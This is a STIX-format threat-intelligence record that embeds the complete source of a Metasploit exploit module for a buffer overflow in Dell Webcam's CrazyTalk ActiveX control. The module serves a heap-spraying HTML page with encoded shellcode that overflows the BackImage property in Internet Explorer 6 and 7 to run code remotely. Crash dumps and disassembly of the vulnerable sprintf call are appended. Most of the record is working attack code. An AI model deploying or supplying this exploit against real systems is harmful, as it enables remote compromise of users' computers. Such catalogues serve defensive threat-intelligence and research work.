{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6b7ceda9-155a-49ca-812c-decc35d73646",
    "created": "2024-08-14T16:43:03.799361Z",
    "modified": "2024-08-14T16:43:03.799365Z",
    "name": "\"Dell Webcam CrazyTalk ActiveX BackImage Vulnerability\"",
    "description": " This module exploits a vulnerability in Dell Webcam's CrazyTalk component. Specifically, when supplying a long string for a file path to the BackImage property, an overflow may occur after checking certain file extension names resulting in remote code execution under the context of the user.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/dell_webcam_crazytalk.rb",
            "external_id": "dell_webcam_crazytalk.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.dell.com/support/drivers/us/en/04/DriverDetails/DriverFileFormats?c=us&l=en&s=bsd&cs=04&DriverId=R230103"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Dell Webcam CrazyTalk ActiveX BackImage Vulnerability\",\n      'Description'    => %q{\n          This module exploits a vulnerability in Dell Webcam's CrazyTalk component.\n        Specifically, when supplying a long string for a file path to the BackImage\n        property, an overflow may occur after checking certain file extension names,\n        resulting in remote code execution under the context of the user.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'rgod',   #Discovery, PoC\n          'sinn3r'  #Metasploit\n        ],\n      'References'     =>\n        [\n          [ 'URL', 'http://www.dell.com/support/drivers/us/en/04/DriverDetails/DriverFileFormats?c=us&l=en&s=bsd&cs=04&DriverId=R230103' ],\n          [ 'EDB', '18621' ],\n          [ 'OSVDB', '80205']\n        ],\n      'Payload'        =>\n        {\n          'BadChars'        => \"\\x00\",\n          'StackAdjustment' => -3500\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC'         => \"seh\",\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', {} ],\n          [ 'IE 6 on Windows XP SP3', { 'Offset' => '0x600'} ],\n          [ 'IE 7 on Windows XP SP3', { 'Offset' => '0x600'} ],\n          [ 'IE 7 on Windows Vista',  { 'Offset' => '0x600'} ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-03-19',\n      'DefaultTarget'  => 0))\n  end\n\n  def get_target(agent)\n    #If the user is already specified by the user, we'll just use that\n    return target if target.name != 'Automatic'\n\n    if agent =~ /NT 5\\.1/ and agent =~ /MSIE 6/\n      return targets[1]  #IE 6 on Windows XP SP3\n    elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 7/\n      return targets[2]  #IE 7 on Windows XP SP3\n    elsif agent =~ /NT 6\\.0/ and agent =~ /MSIE 7/\n      return targets[3]  #IE 7 on Windows Vista\n    else\n      return nil\n    end\n  end\n\n  def on_request_uri(cli, request)\n    agent = request.headers['User-Agent']\n    my_target = get_target(agent)\n\n    # Avoid the attack if the victim doesn't have the same setup we're targeting\n    if my_target.nil?\n      print_error(\"Browser not supported: #{agent.to_s}\")\n      send_not_found(cli)\n      return\n    end\n\n    print_status(\"Target set: #{my_target.name}\")\n\n    p = payload.encoded\n    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(target.arch))\n    js_nops = Rex::Text.to_unescape(\"\\x0c\"*4, Rex::Arch.endian(target.arch))\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    js = <<-JS\n    var heap_obj = new heapLib.ie(0x20000);\n    var code = unescape(\"#{js_code}\");\n    var #{randnop} = \"#{js_nops}\";\n    var nops = unescape(#{randnop});\n\n    while (nops.length < 0x80000) nops += nops;\n    var offset = nops.substring(0, #{my_target['Offset']});\n    var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);\n\n    while (shellcode.length < 0x40000) shellcode += shellcode;\n    var block = shellcode.substring(0, (0x80000-6)/2);\n\n    heap_obj.gc();\n\n    for (var i=1; i < 0x300; i++) {\n      heap_obj.alloc(block);\n    }\n    JS\n\n    js = heaplib(js, {:noobfu => true})\n\n    html = <<-EOS\n    <html>\n    <head>\n    <script>\n    #{js}\n    </script>\n    </head>\n    <body>\n    <object classid='clsid:13149882-F480-4F6B-8C6A-0764F75B99ED' id='target'></object>\n    <script>\n    var arg = \"\\x0c\";\n    while (arg.length < 2000) arg += arg;\n    target.BackImage = arg.substring(0, 2000);\n    </script>\n    </html>\n    EOS\n\n    print_status(\"Sending HTML\")\n    send_response(cli, html, {'Content-Type'=>'text/html'})\n\n  end\nend\n\n=begin\nThe tmp path has the username that we cannot accurately control remotely, so there's\nno point to try to overwrite the stack precisely.\n\ntargetFile = \"C:\\PROGRA~1\\COMMON~1\\REALLU~1\\CTPLAY~1\\CRAZYT~1.OCX\"\nprototype  = \"Invoke_Unknown BackImage As String\"\nmemberName = \"BackImage\"\nprogid     = \"CRAZYTALK4Lib.CrazyTalk4\"\nargCount   = 1\n\n(d4c.d9c): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=00000000 ebx=10005970 ecx=0000b3a0 edx=020bf34f esi=03422f98 edi=020bf5ac\neip=41414141 esp=020bf33c ebp=020bf390 iopl=0         nv up ei pl nz na po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202\n<Unloaded_Ed20.dll>+0x41414140:\n41414141 ??              ???\n\n======\n\n.text:03854F59 lea     ecx, [esp+33Ch+Str1]\n.text:03854F5D push    offset a_asp    ; \".asp\"\n.text:03854F62 push    ecx             ; Str1\n.text:03854F63 mov     [esp+344h+var_308], 0\n.text:03854F68 call    ebx ; _stricmp           <-- Nope\n\n.text:03854F71 lea     edx, [esp+328h+Str1]\n.text:03854F75 push    offset a_php    ; \".php\"\n.text:03854F7A push    edx             ; Str1\n.text:03854F7B call    ebx ; _stricmp           <--- Still nope\n\n.text:03854F84 mov     ebx, [esp+328h+Dest]\n.text:03854F8B lea     eax, [esp+328h+Str1]\n.text:03854F8F lea     ecx, [esp+328h+Filename]\n.text:03854F96 push    eax\n.text:03854F97 add     esi, 3B44h\n.text:03854F9D push    ecx\n.text:03854F9E push    esi\n.text:03854F9F push    offset aSSS     ; \"%s%s%s\"\n.text:03854FA4 push    ebx             ; Dest\n.text:03854FA5 call    ds:sprintf\n=end\n",
    "x_mitre_disclosure_date": "2012-03-19",
    "x_mitre_platforms": [
        "win'"
    ]
}